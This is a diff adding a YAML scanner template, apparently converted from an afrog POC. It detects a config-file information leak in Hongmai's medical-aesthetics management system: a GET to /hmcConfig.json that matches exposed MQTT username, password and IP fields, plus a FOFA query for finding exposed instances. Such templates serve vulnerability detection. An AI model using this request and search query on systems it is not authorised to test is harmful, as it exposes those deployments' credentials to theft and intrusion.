@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"MQTT_USERNAME":'
+          - '"MQTT_PASSWORD":'
+          - '"MQTT_IP":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/hmcConfig.json'
+id: hmc-hmcconfig-infoleak
+info:
+  author: 熊猫也是猫
+  description: |-
+    宏脉信息技术的医美行业管理系统存在hmcConfig存在信息泄露漏洞
+    fofa: title="宏脉医美行业管理系统" || body="宏脉医疗机构管理系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 宏脉信息技术hmcConfig存在信息泄露漏洞
+  severity: high
+  tags: hmc,disclosure,infoleak,argus-import
